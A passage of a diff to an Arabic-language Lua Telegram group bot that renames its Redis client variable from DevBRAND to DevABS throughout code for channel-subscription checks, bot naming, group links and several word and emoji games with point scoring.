 send(msg.chat_id_, msg.id_,'⌁︙البوت ادمن في القناة \n⌁︙تم تفعيل الاشتراك الاجباري \n⌁︙ايدي القناة ↫ '..data.id_..'\n⌁︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
-DevBRAND:set(BRAND..'BRAND:ChId',data.id_)
+DevABS:set(BRAND..'BRAND:ChId',data.id_)
 else
 send(msg.chat_id_, msg.id_,'⌁︙عذرا البوت ليس ادمن في القناة')
 end
@@ -3278,33 +3278,33 @@ end
 end,nil)
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
+if DevABS:get(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
-DevBRAND:del(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
 return false 
 end 
-DevBRAND:del(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
 local DevText = msg.content_.text_:match("(.*)")
-DevBRAND:set(BRAND.."DevText", DevText)
+DevABS:set(BRAND.."DevText", DevText)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
 end
-if DevBRAND:get(BRAND..'BRAND:NameBot'..msg.sender_user_id_) == 'msg' then
+if DevABS:get(BRAND..'BRAND:NameBot'..msg.sender_user_id_) == 'msg' then
 if text and text:match("^الغاء$") then 
-DevBRAND:del(BRAND..'BRAND:NameBot'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:NameBot'..msg.sender_user_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
 return false 
 end 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
-DevBRAND:del(BRAND..'BRAND:NameBot'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:NameBot', text)
+DevABS:del(BRAND..'BRAND:NameBot'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:NameBot', text)
 return false 
 end
 --     Source BRAND     --
 if text == "الرابط" then
-if not DevBRAND:get(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_) then 
-if DevBRAND:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_) then
-Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevBRAND:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_), 1, "html")
+if not DevABS:get(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_) then 
+if DevABS:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_) then
+Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevABS:get(BRAND.."BRAND:Groups:Links"..msg.chat_id_), 1, "html")
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
 end
@@ -3315,39 +3315,39 @@ end
 --     Source BRAND     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == 'بوت' or text == 'بوتت' then 
-NameBot = (DevBRAND:get(BRAND..'BRAND:NameBot') or 'بروكس')
+NameBot = (DevABS:get(BRAND..'BRAND:NameBot') or 'بروكس')
 local BRANDTTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM[math.random(#BRANDTTEAM)] , 1, 'html') 
 return false
 end
 if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
-NameBot = (DevBRAND:get(BRAND..'BRAND:NameBot') or 'بروكس') 
+NameBot = (DevABS:get(BRAND..'BRAND:NameBot') or 'بروكس') 
 local BRANDTTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM[math.random(#BRANDTTEAM)] , 1, 'html') 
 return false
 end
-if text and text == (DevBRAND:get(BRAND..'BRAND:NameBot') or 'بروكس') then 
-NameBot = (DevBRAND:get(BRAND..'BRAND:NameBot') or 'بروكس')
+if text and text == (DevABS:get(BRAND..'BRAND:NameBot') or 'بروكس') then 
+NameBot = (DevABS:get(BRAND..'BRAND:NameBot') or 'بروكس')
 local BRANDTTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, BRANDTTEAM[math.random(#BRANDTTEAM)] , 1, 'html') 
 return false 
 end
 if text =='نقاطي' and ChCheck(msg) then 
-if tonumber((DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
 else 
-Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
+Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
 end
 end
-if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevBRAND:del(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
-if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevBRAND:del(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
+if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevABS:del(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
+if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevABS:del(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
 --     Source BRAND     --
 if text == 'سمايلات' and SourceCh(msg) or text == 'السمايلات' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'🍞','🍞')
 name = string.gsub(name,'🥖','🥖')
 name = string.gsub(name,'🥨','🥨')
@@ -3468,20 +3468,20 @@ BRANDTTEAM = '⌁︙اول واحد يدز هذا السمايل يربح ↫ '.
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end
 if text == 'ترتيب' and SourceCh(msg) or text == 'الترتيب' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'سحور','س ر و ح')
 name = string.gsub(name,'سياره','ه ر س ي ا')
 name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
@@ -3526,18 +3526,18 @@ BRANDTTEAM = '⌁︙اول واحد يرتبها يربح ↫ '..name
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ ترتيب للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end
 if text == 'محيبس' and SourceCh(msg) or text == 'بات' and SourceCh(msg) or text == 'المحيبس' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
 Num = math.random(1,6)
-DevBRAND:set(BRAND.."GAMES"..msg.chat_id_,Num) 
+DevABS:set(BRAND.."GAMES"..msg.chat_id_,Num) 
 TEST = [[
 ➀     ➁     ➂     ➃     ➄     ➅
 ↓     ↓     ↓     ↓     ↓     ↓
@@ -3547,15 +3547,15 @@ TEST = [[
 ⌁︙الفائز يحصل على (5) نقاط
 ]]
 Dev_BRAND(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
-DevBRAND:setex(BRAND.."SET:GAME"..msg.chat_id_, 100, true)  
+DevABS:setex(BRAND.."SET:GAME"..msg.chat_id_, 100, true)  
 return false  
 end end
 if text == 'حزوره' and SourceCh(msg) or text == 'الحزوره' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
 name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
 name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
@@ -3593,20 +3593,20 @@ BRANDTTEAM = '⌁︙اول واحد يحلها يربح ↫ '..name
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ حزوره للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'المعاني' and SourceCh(msg) or text == 'معاني' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum2'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum2'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'قرد','🐒')
 name = string.gsub(name,'دجاجه','🐔')
 name = string.gsub(name,'بطريق','🐧')
@@ -3636,20 +3636,20 @@ BRANDTTEAM = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum2'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum2'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المعاني للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'العكس' and SourceCh(msg) or text == 'عكس' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum3'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum3'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'باي','هلو')
 name = string.gsub(name,'فهمت','مافهمت')
 name = string.gsub(name,'موزين','زين')
@@ -3679,20 +3679,20 @@ BRANDTTEAM = '⌁︙ما هو عكس كلمة ↫ '..name
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum3'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum3'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ العكس للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end 
 if text == 'المختلف' and SourceCh(msg) or text == 'مختلف' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum4'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum4'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
 name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
 name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
@@ -3725,22 +3725,22 @@ BRANDTTEAM = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum4'..msg.chat_id_) and not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+if text == DevABS:get(BRAND..'BRAND:GameNum4'..msg.chat_id_) and not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ المختلف للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'امثله' and SourceCh(msg) or text == 'الامثله' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {
 'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
 };
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum5'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum5'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
 name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
 name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
@@ -3765,21 +3765,21 @@ BRANDTTEAM = '⌁︙اكمل المثال التالي ↫ ['..name..']'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum5'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevBRAND:del(BRAND..'BRAND:GameNum5'..msg.chat_id_)
+if text == DevABS:get(BRAND..'BRAND:GameNum5'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:del(BRAND..'BRAND:GameNum5'..msg.chat_id_)
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ امثله للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'رياضيات' and SourceCh(msg) or text == 'الرياضيات' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum6'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
+name = DevABS2[math.random(#DevABS2)]
